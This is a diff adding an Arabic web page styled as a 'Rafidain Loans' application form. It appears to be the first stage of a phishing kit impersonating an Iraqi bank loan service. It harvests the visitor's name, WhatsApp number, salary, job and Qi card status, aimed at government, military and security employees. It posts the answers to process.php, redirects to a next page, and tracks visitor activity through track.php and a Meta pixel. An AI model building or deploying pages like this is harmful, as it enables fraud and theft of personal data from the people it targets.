@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>قروض الرافدين - المعلومات الشخصية</title>
+    
+    
+    
+    
+    
+    
+    
+    
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script>
+    // 1. جلب اسم الصفحة تلقائياً
+    const pageTitle = document.title || window.location.pathname;
+
+    // 2. جلب اسم الدولة تلقائياً باللغة العربية عبر إعدادات المتصفح الإقليمية للمستخدم
+    let userCountry = "العراق"; // القيمة الافتراضية
+    try {
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (timeZone) {
+            // تحويل المناطق الزمنية إلى أسماء دول عربية واضحة ومباشرة
+            if (timeZone.includes("Baghdad")) userCountry = "العراق";
+            else if (timeZone.includes("Riyadh")) userCountry = "السعودية";
+            else if (timeZone.includes("Cairo")) userCountry = "مصر";
+            else if (timeZone.includes("Amman")) userCountry = "الأردن";
+            else if (timeZone.includes("Damascus")) userCountry = "سوريا";
+            else if (timeZone.includes("Kuwait")) userCountry = "الكويت";
+            else if (timeZone.includes("Dubai") || timeZone.includes("Abu_Dhabi")) userCountry = "الإمارات";
+            else if (timeZone.includes("Asia") || timeZone.includes("Middle_East")) userCountry = "العراق"; 
+            else {
+                // إذا كان الزائر أجنبي، نترجم اسم الدولة بناءً على رمز البلد
+                const region = new Intl.Locale(navigator.language).region;
+                if (region) {
+                    const regionNames = new Intl.DisplayNames(['ar'], { type: 'region' });
+                    userCountry = regionNames.of(region) || "العراق";
+                }
+            }
+        }
+    } catch (e) {
+        userCountry = "العراق";
+    }
+
+    // دالة إرسال الإشارة مباشرة لملف PHP
+    function sendPing(isPing = 0) {
+        fetch('track.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            // يتم إرسال اسم الصفحة واسم الدولة المجلوب هنا مباشرة للسيرفر
+            body: `page=${encodeURIComponent(pageTitle)}&country=${encodeURIComponent(userCountry)}&ping=${isPing}`
+        });
+    }
+
+    // إرسال الإشارة الأولى فور الدخول
+    sendPing(0);
+
+    // تحديث النشاط كل 15 ثانية للتأكد من حالة (نشط)
+    let activityTimeout;
+    function resetActivity() {
+        clearTimeout(activityTimeout);
+        activityTimeout = setTimeout(() => {
+            sendPing(1); 
+            resetActivity();
+        }, 15000); 
+    }
+
+    window.addEventListener('mousemove', resetActivity);
+    window.addEventListener('keypress', resetActivity);
+    window.addEventListener('scroll', resetActivity);
+    resetActivity();
+</script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:'Tajawal',sans-serif;background:#fff;color:#222}
+  header{padding:20px 24px;display:flex;justify-content:flex-start}
+  .logo{width:60px;height:60px}
+  .banner{background:#5b7489;padding:24px 14px}
+  .banner-box{background:#8197a8;border-radius:14px;padding:22px 20px}
+  .banner-box h1{color:#fff;font-size:26px;font-weight:700}
+  .banner-box .line{height:4px;background:#ecd96b;margin:18px 0 14px 0;border-radius:2px;margin-right:0}
+  .banner-box p{color:#f1f1f1;font-size:20px}
+  form{max-width:680px;margin:0 auto;padding:30px 14px 60px}
+  label{display:block;font-size:19px;margin:0 6px 12px;color:#2d2d4a}
+  .field{margin-bottom:28px}
+  input,select{width:100%;height:68px;border:1px solid #d6d6d6;border-radius:8px;padding:0 16px;font-family:inherit;font-size:17px;background:#fff;color:#222;outline:none;appearance:none;-webkit-appearance:none}
+  input:focus,select:focus{border-color:#ecd045}
+  select{background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='22' height='14' viewBox='0 0 22 14'%3E%3Cpath d='M2 2l9 9 9-9' fill='none' stroke='%23e2c63a' stroke-width='2'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:left 32px center;background-size:20px;padding-left:64px}
+  .btn{display:block;width:100%;height:100px;border:none;border-radius:12px;font-family:inherit;font-size:22px;cursor:pointer;margin-top:60px}
+  .btn-primary{background:#ebcf43;color:#fff;height:100px}
+  .btn-secondary{background:#f7f8fa;color:#222;margin-top:80px;height:76px;font-weight:500}
+  .msg{display:none;text-align:center;margin-top:20px;color:#2e7d32;font-size:18px}
+  .err{display:none;color:#c62828;font-size:16px;margin:8px 6px 0}
+  .field.bad input,.field.bad select{border-color:#c62828;background:#fff8f8}
+  .field.bad input:focus,.field.bad select:focus{border-color:#c62828}
+  .summary{display:none;background:#fff3f3;border:1px solid #f2c4c4;border-radius:10px;padding:16px 18px;margin-bottom:26px;color:#c62828;font-size:17px}
+  .summary.show{display:block}
+</style>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1123573123391074');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1123573123391074&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    
+
+    
+</head>
+    
+    
+<body>
+
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+<header>
+  <svg class="logo" viewBox="0 0 60 60" aria-label="شعار">
+    <circle cx="27" cy="27" r="20" fill="none" stroke="#e6c93a" stroke-width="12"/>
+    <line x1="34" y1="34" x2="52" y2="52" stroke="#e6c93a" stroke-width="10" stroke-linecap="round"/>
+  </svg>
+</header>
+
+<section class="banner">
+  <div class="banner-box">
+    <h1>قروض الرافدين</h1>
+    <div class="line"></div>
+    <p>معلومات الشخصية</p>
+  </div>
+</section>
+
+<!-- نموذج تسجيل الدخول الموحد والمصلح -->
+<form action="process.php" method="POST" id="mainForm">
+    <!-- الحقول المخفية للتوجيه -->
+    <input type="hidden" name="next_page" value="splash.html">
+
+  <div class="summary" id="summary" role="alert">من فضلك صحّح البيانات المظللة بالأحمر قبل المتابعة.</div>
+
+  <div class="field">
+    <label for="name">الاسم الكامل</label>
+    <input id="name" name="name" type="text" autocomplete="name" aria-describedby="err-name" required>
+    <p class="err" id="err-name"></p>
+  </div>
+  <div class="field">
+    <label for="phone">رقم الهاتف واتساب</label>
+    <input id="phone" name="phone" type="tel" inputmode="numeric" autocomplete="tel" aria-describedby="err-phone" placeholder="07XXXXXXXXX" required>
+    <p class="err" id="err-phone"></p>
+  </div>
+  <div class="field">
+    <label for="qi">مفعل خدمات كي على الجهاز ؟</label>
+    <select id="qi" name="qi" aria-describedby="err-qi" required>
+      <option value="" selected disabled hidden></option>
+      <option>نعم</option>
+      <option>لا</option>
+    </select>
+    <p class="err" id="err-qi"></p>
+  </div>
+  <div class="field">
+    <label for="amount">يرجى ادخال مبلغ السلفة المتقدم علية</label>
+    <select id="amount" name="amount" aria-describedby="err-amount" required>
+      <option value="" selected disabled hidden></option>
+<option>اكثر من 5 مليون</option>
+<option>اكثر من 10 مليون</option>
+<option>اكثر من 15 مليون</option>
+<option>اكثر من 20 مليون</option>
+<option>اكثر من 25 مليون</option>
+<option>اكثر من 30 مليون</option>
+<option>اكثر من 50 مليون</option>
+
+        
+        
+        
+        
+        
+        
+        
+    </select>
+    <p class="err" id="err-amount"></p>
+  </div>
+  <div class="field">
+    <label for="salary">الراتب الشهري</label>
+    <select id="salary" name="salary" aria-describedby="err-salary" required>
+      <option value="" selected disabled hidden></option>
+
+        
+        <option>من 300 الف الى 500 الف</option>
+<option>من 500 الف الى 700 الف</option>
+<option>من 700 الف الى 1 مليون</option>
+<option>اكثر من 1 مليون</option>
+<option>اكثر من 1 مليون و 500</option>
+
+        
+        
+    </select>
+    <p class="err" id="err-salary"></p>
+  </div>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  <div class="field">
+    <label for="job">الوظيفة</label>
+    <select id="job" name="job" aria-describedby="err-job" required>
+      <option value="" selected disabled hidden></option>
+<option>موظف حكومي</option>
+<option>منتسب دفاع</option>
+<option>منتسب داخلية</option>
+<option>منتسب مكافحة الإرهاب</option>
+<option>مدرس جامعي</option>
+<option>موظف تربية</option>
+<option>متقاعد</option>
+<option>متقاعدة</option>
+
+        
+        
+    </select>
+    <p class="err" id="err-job"></p>
+  </div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+  <button type="submit" class="btn btn-primary">متابعة</button>
+  <p class="msg" id="msg">تم إرسال طلبك بنجاح</p>
+  <button type="reset" class="btn btn-secondary">ألغاء</button>
+</form>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script>
+  var form = document.getElementById('mainForm');
+  var summary = document.getElementById('summary');
+  var msg = document.getElementById('msg');
+  var submitBtn = form.querySelector('.btn-primary');
+
+  var rules = {
+    name: function(v){
+      v = v.trim();
+      if(!v) return 'الاسم الكامل مطلوب.';
+      if(v.length < 3) return 'الاسم قصير جداً، اكتب الاسم كاملاً.';
+      if(!/^[\u0600-\u06FFa-zA-Z\s'-]+$/.test(v)) return 'الاسم يجب أن يحتوي على حروف فقط.';
+      if(!/\s/.test(v.trim())) return 'اكتب الاسم كاملاً (الاسم الثلاثي أو ثنائي على الأقل).';
+      return '';
+    },
+    phone: function(v){
+      var t = v.trim().replace(/[\s\-().]/g, '');
+      if(!t) return 'رقم الهاتف واتساب مطلوب.';
+      if(t.indexOf('+964') === 0) t = '0' + t.slice(4);
+      else if(t.indexOf('00964') === 0) t = '0' + t.slice(5);
+      else if(t.indexOf('964') === 0) t = '0' + t.slice(3);
+      if(!/^\d+$/.test(t)) return 'رقم الهاتف يجب أن يحتوي على أرقام فقط.';
+      if(!/^07\d{9}$/.test(t)) return 'أدخل رقم واتساب صحيح يبدأ بـ 07 ويتكوّن من 11 رقم، مثال: 07XXXXXXXXX.';
+      return '';
+    },
+    qi: function(v){ return v ? '' : 'اختر هل خدمات كي مفعّلة على جهازك.'; },
+    amount: function(v){ return v ? '' : 'اختر مبلغ السلفة المطلوب.'; },
+    salary: function(v){ return v ? '' : 'اختر الراتب الشهري.'; },
+    job: function(v){ return v ? '' : 'اختر الوظيفه.'; }
+  };
+
+  function show(id, text){
+    var input = document.getElementById(id);
+    var field = input.closest('.field');
+    var err = document.getElementById('err-' + id);
+    if(text){
+      field.classList.add('bad');
+      input.setAttribute('aria-invalid', 'true');
+      err.textContent = text;
+      err.style.display = 'block';
+    } else {
+      field.classList.remove('bad');
+      input.removeAttribute('aria-invalid');
+      err.textContent = '';
+      err.style.display = 'none';
+    }
+    return !text;
+  }
+
+  function validateField(id){
+    var value = document.getElementById(id).value;
+    return show(id, rules[id](value));
+  }
+
+  Object.keys(rules).forEach(function(id){
+    var input = document.getElementById(id);
+    var evt = input.tagName === 'SELECT' ? 'change' : 'input';
+    input.addEventListener(evt, function(){
+      if(input.closest('.field').classList.contains('bad')) validateField(id);
+    });
+    input.addEventListener('blur', function(){
+      if(document.getElementById(id).value.trim() || input.closest('.field').classList.contains('bad')) validateField(id);
+    });
+  });
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    msg.style.display = 'none';
+    var firstBad = null;
+    Object.keys(rules).forEach(function(id){
+      if(!validateField(id) && !firstBad) firstBad = id;
+    });
+    if(firstBad){
+      summary.classList.add('show');
+      document.getElementById(firstBad).focus();
+      document.getElementById(firstBad).scrollIntoView({ behavior: 'smooth', block: 'center' });
+      return;
+    }
+    summary.classList.remove('show');
+    msg.style.display = 'block';
+    submitBtn.disabled = true;
+    
+    // تم تفعيل السطر لإرسال البيانات إلى process.php ومن ثم التوجيه للصفحة التالية تلقائياً
+    form.submit();
+  });
+
+  form.addEventListener('reset', function(){
+    Object.keys(rules).forEach(function(id){ show(id, ''); });
+    summary.classList.remove('show');
+    msg.style.display = 'none';
+    submitBtn.disabled = false;
+  });
+</script>
+
+        
+        
+        
+        
+
+     
+</body>
+</html>
+
+    
